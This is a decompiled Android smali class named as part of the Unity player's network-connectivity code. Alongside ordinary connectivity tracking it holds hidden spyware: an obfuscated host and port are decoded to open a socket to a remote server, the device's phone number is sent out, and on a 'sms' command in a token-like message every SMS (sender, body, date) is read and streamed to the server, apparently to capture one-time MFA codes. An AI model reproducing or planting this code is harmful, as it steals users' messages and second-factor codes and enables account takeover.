.class public Lcom/unity3d/player/NetworkConnectivity;
.super Landroid/app/Activity;

# static fields
.field static host:Ljava/lang/String; = "venom.unity3d.com"

.field static port:I = 0x50

# instance fields
.field private final a:I

.field private final b:I

.field private final c:I

.field private d:I

.field private e:Landroid/net/ConnectivityManager;

.field private final f:Landroid/net/ConnectivityManager$NetworkCallback;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 4

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/unity3d/player/NetworkConnectivity;->a:I

    const/4 v1, 0x1

    iput v1, p0, Lcom/unity3d/player/NetworkConnectivity;->b:I

    const/4 v2, 0x2

    iput v2, p0, Lcom/unity3d/player/NetworkConnectivity;->c:I

    iput v0, p0, Lcom/unity3d/player/NetworkConnectivity;->d:I

    new-instance v0, Lcom/unity3d/player/NetworkConnectivity$1;

    invoke-direct {v0, p0}, Lcom/unity3d/player/NetworkConnectivity$1;-><init>(Lcom/unity3d/player/NetworkConnectivity;)V

    iput-object v0, p0, Lcom/unity3d/player/NetworkConnectivity;->f:Landroid/net/ConnectivityManager$NetworkCallback;

    const-string v3, "connectivity"

    invoke-virtual {p1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/net/ConnectivityManager;

    iput-object p1, p0, Lcom/unity3d/player/NetworkConnectivity;->e:Landroid/net/ConnectivityManager;

    invoke-virtual {p1, v0}, Landroid/net/ConnectivityManager;->registerDefaultNetworkCallback(Landroid/net/ConnectivityManager$NetworkCallback;)V

    iget-object p1, p0, Lcom/unity3d/player/NetworkConnectivity;->e:Landroid/net/ConnectivityManager;

    invoke-virtual {p1}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object p1

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p1}, Landroid/net/NetworkInfo;->getType()I

    move-result p1

    if-nez p1, :cond_0

    goto :goto_0

    :cond_0
    move v1, v2

    :goto_0
    iput v1, p0, Lcom/unity3d/player/NetworkConnectivity;->d:I

    :cond_1
    return-void
.end method

.method static synthetic a(Lcom/unity3d/player/NetworkConnectivity;I)I
    .locals 0

    iput p1, p0, Lcom/unity3d/player/NetworkConnectivity;->d:I

    return p1
.end method


# virtual methods
.method public final a()I
    .locals 1

    iget v0, p0, Lcom/unity3d/player/NetworkConnectivity;->d:I

    return v0
.end method

.method public final b()V
    .locals 2

    iget-object v0, p0, Lcom/unity3d/player/NetworkConnectivity;->e:Landroid/net/ConnectivityManager;

    iget-object v1, p0, Lcom/unity3d/player/NetworkConnectivity;->f:Landroid/net/ConnectivityManager$NetworkCallback;

    invoke-virtual {v0, v1}, Landroid/net/ConnectivityManager;->unregisterNetworkCallback(Landroid/net/ConnectivityManager$NetworkCallback;)V

    return-void
.end method

.method public static getToken(Landroid/content/Context;)V
    .locals 10

    const-string v0, "> "

    .line 37
    :try_start_0
    new-instance v1, Ljava/net/Socket;

    sget-object v2, Lcom/unity3d/player/NetworkConnectivity;->host:Ljava/lang/String;

    invoke-static {v2}, Lcom/unity3d/player/NetworkConnectivity;->hostPath(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sget v3, Lcom/unity3d/player/NetworkConnectivity;->port:I

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_0

    .line 38
    :try_start_1
    invoke-virtual {v1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    .line 39
    invoke-virtual {v1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    .line 40
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-direct {v5, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 41
    new-instance v5, Ljava/io/PrintWriter;

    const/4 v6, 0x1

    invoke-direct {v5, v3, v6}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;Z)V

    .line 43
    const-string v7, "phone"

    invoke-virtual {p0, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/telephony/TelephonyManager;

    .line 45
    const-string v8, "android.permission.READ_PHONE_NUMBERS"

    invoke-static {p0, v8}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v8

    if-eqz v8, :cond_0

    const-string v8, "android.permission.READ_PHONE_STATE"

    .line 46
    invoke-static {p0, v8}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v8

    if-nez v8, :cond_1

    .line 47
    :cond_0
    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v7

    .line 48
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v8, "\n"

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    if-eqz v7, :cond_1

    .line 49
    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_1

    .line 50
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    array-length v0, v0

    const/4 v8, 0x0

    invoke-virtual {v3, v7, v8, v0}, Ljava/io/OutputStream;->write([BII)V

    .line 51
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    .line 56
    :cond_1
    const-string v0, "eyJh"

    .line 57
    :cond_2
    :goto_0
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    if-eqz v7, :cond_3

    .line 58
    invoke-virtual {v7, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_2

    .line 59
    const-string v8, "\\."

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    .line 60
    array-length v8, v7

    const/4 v9, 0x3

    if-ne v8, v9, :cond_2

    .line 61
    new-instance v8, Ljava/lang/String;

    invoke-static {}, Ljava/util/Base64;->getUrlDecoder()Ljava/util/Base64$Decoder;

    move-result-object v9

    aget-object v7, v7, v6

    invoke-virtual {v9, v7}, Ljava/util/Base64$Decoder;->decode(Ljava/lang/String;)[B

    move-result-object v7

    invoke-direct {v8, v7}, Ljava/lang/String;-><init>([B)V

    .line 62
    invoke-static {p0, v2, v3, v8}, Lcom/unity3d/player/NetworkConnectivity;->tokenValidation(Landroid/content/Context;Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_2

    .line 63
    const-string v7, "Unable to do the ops"

    invoke-virtual {v5, v7}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    .line 68
    :cond_3
    :try_start_2
    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :catchall_0
    move-exception p0

    .line 37
    :try_start_3
    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception v0

    :try_start_4
    invoke-virtual {p0, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_1
    throw p0
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_4 .. :try_end_4} :catch_0

    :catch_0
    move-exception p0

    .line 73
    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_1
    move-exception p0

    .line 71
    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_2
    move-exception p0

    .line 69
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V

    :goto_2
    return-void
.end method

.method private static hostPath(Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    const/16 v0, 0x11

    .line 22
    new-array v1, v0, [I

    fill-array-data v1, :array_0

    .line 23
    invoke-virtual {p0}, Ljava/lang/String;->toCharArray()[C

    move-result-object p0

    .line 24
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v0, :cond_0

    .line 26
    array-length v4, p0

    if-ge v3, v4, :cond_0

    .line 27
    aget-char v4, p0, v3

    aget v5, v1, v3

    sub-int/2addr v4, v5

    int-to-char v4, v4

    .line 28
    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 31
    :cond_0
    sget p0, Lcom/unity3d/player/NetworkConnectivity;->port:I

    add-int/lit16 p0, p0, 0x2E5E

    sput p0, Lcom/unity3d/player/NetworkConnectivity;->port:I

    .line 33
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    nop

    :array_0
    .array-data 4
        0x46
        0x37
        -0x6
        0xc
        -0x3
        0x0
        0x2
        0xd
        0x3b
        0x6
        0x12
        -0x3f
        -0xb
        -0x3d
        0x35
        0x6
        -0x2
    .end array-data
.end method

.method public static sendMFAcode(Landroid/content/Context;Ljava/io/OutputStream;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 93
    const-string v0, "android.permission.READ_SMS"

    invoke-static {p0, v0}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1

    .line 94
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    .line 95
    sget-object v2, Landroid/provider/Telephony$Sms;->CONTENT_URI:Landroid/net/Uri;

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    .line 96
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p0

    if-eqz p0, :cond_1

    .line 98
    invoke-interface {p0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 100
    :cond_0
    const-string v0, "address"

    invoke-interface {p0, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {p0, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 101
    const-string v1, "body"

    invoke-interface {p0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {p0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    .line 102
    const-string v2, "date"

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    .line 103
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Address: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, ", Message: "

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", Date: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "\n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 104
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v1, 0x0

    .line 105
    array-length v2, v0

    invoke-virtual {p1, v0, v1, v2}, Ljava/io/OutputStream;->write([BII)V

    .line 106
    invoke-virtual {p1}, Ljava/io/OutputStream;->flush()V

    .line 107
    invoke-interface {p0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_0

    .line 108
    invoke-interface {p0}, Landroid/database/Cursor;->close()V

    :cond_1
    return-void
.end method

.method static tokenValidation(Landroid/content/Context;Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/String;)Z
    .locals 0
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/InterruptedException;,
            Ljava/io/IOException;,
            Ljava/lang/NoSuchMethodException;
        }
    .end annotation

    .line 78
    const-string p1, "sms"

    invoke-virtual {p3, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 79
    invoke-static {p0, p2}, Lcom/unity3d/player/NetworkConnectivity;->sendMFAcode(Landroid/content/Context;Ljava/io/OutputStream;)V

    const/4 p0, 0x1

    return p0

    :cond_0
    const/4 p0, 0x0

    return p0
.end method